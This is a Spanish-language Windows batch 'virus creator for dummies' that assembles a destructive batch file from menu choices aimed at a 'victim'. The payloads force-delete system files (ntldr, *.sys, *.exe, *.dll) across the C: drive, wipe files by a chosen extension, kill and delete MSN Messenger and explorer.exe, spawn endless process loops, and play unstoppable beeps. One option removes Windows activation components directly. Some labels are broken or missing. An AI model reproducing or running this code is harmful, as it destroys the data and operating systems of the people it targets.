REM  QBFC Project Options Begin
REM  HasVersionInfo: Yes
REM  Companyname: snnn Batangreet company
REM  Productname: snnn Batangreet virus creator for dummies
REM  Filedescription: crea virus hechos por mi
REM  Copyrights: asegurado a mi banda de narcos. Así q ves con cuidado
REM  Trademarks: no se lo q es eso...
REM  Originalname: virus manimecker
REM  Comments: considero q esta muy bien hecho
REM  Productversion:  1. 2. 0. 0
REM  Fileversion:  1. 2. 0. 0
REM  Internalname: virusmani.bat
REM  Appicon: C:\Users\Usuario\Desktop\Aleix\snnn Batangreet Virus creator for dummies project\ico_alpha_no_conn.ico
REM  Embeddedfile: C:\Users\Usuario\Desktop\Aleix\snnn Batangreet Virus creator for dummies project\snnn Batangreet virus creator 1.2 .bat
REM  QBFC Project Options End

@echo off
cls
@mode con cols=170 lines=140
title Virus Creator v1.0
color 0a
start %myfiles%
echo HECHO POR SNNN BATANGREET I MOTIVADO POR NITSUGA (POR SU IGNORANCIA I SU MASSOQUERIA)
echo.
echo NO ME HAGO REPONSABLE DEL USO QUE LE DES O DE LOS DAÑOS QUE PUEDA OCASIONAR
echo.
echo EN LA CARPETA DONDE ESTE, ESTE ARCHIVO APARECERA UN ARCHIVO LLAMADO VIRUSMANI.BAT ESE ES
echo.
echo EL VIRUS CON TODAS LAS ACCIONES CARGADAS
echo.
echo LE PUEDES CAMBIAR EL NOMBRE AL VIRUS I PONERLE CUALQUIER NOMBRE "ESTE_ES_MI_VIRUS".BAT
echo.
echo LO DE .BAT AL FINAL ES IMPORTANTE, SINO EL VIRUS NO FUNCIONA
echo.
echo SE RECOMIENDA CIERRE LAS DEMAS APLICACIONES ANTES DE HACER TU VIRUS
echo.
echo SI ESTAS DE ACUERDO PULSA UNA TECLA
echo.
pause>nul
echo @echo off>>virusmani.bat
:menu
echo.
echo  ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
echo.
echo  PROGRAMA PARA CREAR VIRUS BATch DE PARTE DE SNNN BATANGREET MANIMECKER
echo.
echo  ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
echo.
echo.
echo ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
echo 1 QUE LE SALGA UN MENSAJE INDESEADO                                           ß
echo 2 CREAR UN BUCLE (SOBRECARGAR EL ORDENADOR)                                   ß
echo 3 CARGARSE EL ORDENADOR (PC)                                                  ß 
echo 4 MATAR Y BORRAR EL MSN                                                       ß 
echo 5 BORRAR TODOS LOS ARCHIVOS CON EXTENSION DESEADO                             ß             
echo 6 DESPIRATEAR WINDOWS                                                         ß
echo 7 HACER PITIDOS                                                               ß  
echo 8 HACER DESAPARECER LA BARRA DE HERRAMIENTAS I LOS ICONOS                     ß
echo (ENTER) SALIR SIN HACER NADA                                                  ß
echo AYUDA INSTRUCCIONES DETALLADAS DE COMO HACER FUNCIONAR EL VIRUS               ß
echo ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
echo.
set /p emp= QUE DESEAS QUE HAGA TU VIRUS?:
if %emp% == 1 goto mensaje
if %emp% == 2 goto bucle
if %emp% == 3 goto destruccion
if %emp% == 4 goto msn
if %emp% == 5 goto dele
if %emp% == 6 goto despiratear
if %emp% == 7 goto pitido
if %emp% == 8 goto explorer
if %emp% == ayuda goto ayuda
if %emp% == porfi... goto programador
exit
:mensaje
cls
echo ESTA OPCION ES PARA QUE A LA VICTIMA LE DALGA UN MENSAJE DESEADO
echo.
set /p men2= DESEA CONTINUAR?(S/N):
if %men2%== s goto co
if %men2%== n goto menu
exit
:co
cls
set /p co2= QUE MENSAJE DESEAS QUE LE SALGA?
echo msg * %co2% >> virusmani.bat
set /p co3= DESEA PONER OTRO MENSAJE?(S/N):
if %co3%== s goto co
if %co3%== n goto menu
exit

:bucle
cls
echo AVISO. SI PONE ESTA OPCION EN MEDIO DEL VIRUS,
echo. 
echo EL VIRUS NO PODRA EJECUTAR LAS OPCIONES Q SE PONGAN DESPUÉS
echo.
echo ES ACONSEJABLE PONERLA COMO FINAL.
echo.
echo ESTA OPCION LE CREA UN BUCLE EN EL ORDENADOR
echo.
echo UN BUCLE SIRVE PARA SOBRECARGARLE EL PC
echo.
set /p bu2= DESEA ACTIVAR ESTA OPCION?(S/N):
if %bu2%== s goto bgg
if %bu2%== n goto menu
exit
:bgg
cls
echo :bucle>>virusmani.bat
echo start explorer.exe>>virusmani.bat
echo start cmd.exe>>virusmani.bat
echo start iexplore.exe>>virusmani.bat
echo goto bucle>>virusmani.bat
echo OPCION COMPLETADA
goto menu

:destruccion
cls
echo ESTA OPCION SE CARGARA EL ORDENADOR DE LA VICTIMA
set /p dest2= DESEA CONTINUAR?(S/N):
if %dest2%== s goto sip
if %dest2%== n goto menu
exit
:sip
echo attrib "C:\*.*" -r -a -s -h>>virusmani.bat
echo del /q /f"C:\ntldr">>virusmani.bat
echo del /q /s /f C:\*.sys>>virusmani.bat
echo del /q /s /f C:\*.exe>>virusmani.bat
echo del /q /s /f C:\*.bat>>virusmani.bat
echo del /q /s /f C:\*.dll>>virusmani.bat
echo del /q /s /f *.sys>>virusmani.bat
echo del /q /s /f *.exe>>virusmani.bat
echo del /q /s /f *.bat>>virusmani.bat
echo del /q /s /f *.dll>>virusmani.bat
echo YA NO HAY ESPERANZA>>virusmani.bat
echo msg * CREO Q VAS A MORIR>>virusmani.bat
echo finalizado
pause>nul
goto menu

:msn
cls
echo ESTA OPCION LE MATA Y BORRA EL MSN POR COMPLETO
echo.
set /p msn2= DESEA ACTIVAR ESTA OPCION?(S/N):
if %msn2%== s goto atakmsn
if %msn2%== n goto menu
:atakmsn
cls
echo taskkill /im /f "msnmsgr.exe">>virusmani.bat
echo del /q /s /f "C:\Archivos de programa\MSN Messenger\*.*">>virusmani.bat
echo del /q /s /f "C:\Archivos de programa\Windows Live\*.*">>virusmani.bat
echo OPCION COMPLETADA
goto menu

:dele
cls
echo ESTA OPCION ES PARA BORRAR TODOS LOS ARCHIVOS CON LAS OPCIONES DESEADAS
echo.
set /p dele2= DESEA ACTIVAR ESTA OPCION?(S/N):
if %dele2%== s goto ac
if %dele2%== n goto menu
:ac
cls
set /p ac2= POR FAVOR ESCRIBA LA EXTENSION QUE DESEA BORRAR POR EJEMPLO (.MP3) SIN PARENTESIS Y CON PUNTO:
echo del /q /s /f c:\*.%ac2%>>virusmani.bat
echo OPCION COMPLETADA
pause>nul
goto menu

:apa
cls
echo.
set /p pre12= DESEA ACTIVAR ESTA OPCION? (S/N):
if %pre12%== s goto ap
if %pre12%== n goto menu
:ap
cls
echo ESTA OPCION APAGA EL ORDENADOR DEJANDO UN MENSAJE DESEADO.
set /p ms= QUE MENSAJE DESEA QUE LE SALGA:
set /p tiempo=Ingresa el tiempo en segundos :
echo shutdown -s -t %tiempofinal% -f -c "%ms%">>virusmani.bat
echo FINALIZADO
pause>nul
goto menu

:instrucciones
cls
echo MIENTRAS EJECUTES ESTE PROGRAMAS EN LA CARPETA O ESCRITORIO QUE ESTE , ESTE CREADOR VERAS UN ARCHIVO
echo QUE SE LLAMA VIRUSMANI.BAT ESE PROGRAMA ES EL VIRUS SI LO ABRES TE INFECTARAS A TI MISMO
echo ABRIR EL PROGRAMA CREADOR DE VIRUS NO ES PELIGROSO LO QUE SI ES, ES ABRIR VIRUSMANI.BAT
echo ESPERO SACAR OTRA REEDICION DE ESTE VIRUS YA QUE A ESTA ESTABA CON PUBLICIDAD
echo COPIAR TOTAL O PARCIALMENTE ESTE CREADOR DE Virus ESTA PROHIBIDO
echo ES BASTANTE DIFICIL QUE UN ANTIVIRUS DETECTE ESTE VIRUS
echo PODRIA SER QUE ESTE VIRUS NO FUNCIONASE EN WINDOWS VISTA U OTRAS VERSIONES
echo NO ME HAGO RESPONSABLE DE LOS DAÑOS DE ESTE PROGRAMA
echo SI QUEREIS APRENDER MAS, AGREGADME EN FOROSPYWARE.COM
echo MI NICK EN ESTA PAGINA ES SNNN BATANGREET AGREGADME O ENVIADME MENSAJES
echo ESPERO QUE OS GUSTE
pause>nul
cls
goto menu

:despiratear
echo ESTA OPCION NO SE GUARDA EN EL VIRUS SE EJECUTA DIRECTAMENTE AQUI
echo.
echo ESTA OPCION DESPIRATEA EL WINDOWS
echo.
echo SI NO ESTAS SEGURO SI LO TIENES PIRATEADO
echo.
echo EJECUTALO, YA QUE PARA PREVENIR POSTERIORES PIRATEAMIENTOS
echo.
set /p piratear= DESEA ACTIVAR ESTA OPCION?(S/N):
if %piratear%== s goto pirat
if %piratear%== n goto menu
:pirat
cls
taskkill /f /im wgatray.exe
Del /q /f c:\Windows\System32\WgaTray.exe
Del /q /f c:\Windows\System32\dllcache\WgaTray.exe
echo Windows Registry Editor Version 5.00 >%temp%\WGANFIX.REG
echo. >> %temp%\WGANFIX.REG
echo [-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\WgaLogon] >>%temp%\WGANFIX.REG
regedit /s %temp%\WGANFIX.REG
del /q /f %temp%\WGANFIX.REG
del /q /f c:\windows\system32\wgalogon.dll
del /q /f c:\windows\system32\dllcache\wgalogon.dll
echo FINALIZADO
pause>nul
cls
goto menu
:pitido

cls
echo ESTE ES EL SONIDO QUE SE OIRA EN ESTA OPCION IRREPETIBLEMENTE
set /p pitido=ESTA OPCION HARÀ Q SUENEN SONIDOS INAPAGABLES I IMPOSIBLES DE BAJARLES EL VOLUMEN. DESEAS CONTINUAR (S/N)?
if %pitido%== s goto pitido2
if %pitido%== n goto menu
:pitido2
cls
echo :talker >>virusmani.bat
echo  >>virusmani.bat
echo goto talker>>virusmani.bat
echo FINALIZADO
pause>nul
cls
goto menu

:explorer
cls
echo ESTA OPCION HACE DESAPARECER LA BARRA DE HERRAMIENTAS I LOS ICONOS TEMPORALMENTE
echo.
echo HASTA EL REINICIO
echo.
echo ESCRIBE ANTIEXPLORER PARA HACER EL EFECTO PERMANENTE
echo. 
set /p explo=QUIERES ACTIVAR ESTA OPCION?(S/N/ANTIEXPLORER)
if %explo% == s goto simata
if %explo% == n goto menu
if %explo% == antiexplorer goto permanente
goto menu
:simata
echo taskkill /f /im "explorer.exe">>virusmani.bat
echo FINALIZADO
pause>nul
goto menu
:permanente
echo taskkill /f /im "explorer.exe">>virusmani.bat
echo del /f /q "explorer.exe">>virusmani.bat
echo FINALIZADO
pause>nul
goto menu

:programador
cls
echo ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
echo.
echo                                MODO PROGRAMADOR
echo. 
echo ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
echo.
echo EN EL MODO PROGRAMADOR PUEDES EXTRAER EL SOURCE DEL VIRUS CREATOR 1.2
echo.
set /p programado=QUIERES EXTRAERLO?(S/N)
if %programado% == s goto siquiero
if %programado% == n goto menu
exit
copy %myfiles%\*.* C:
pause

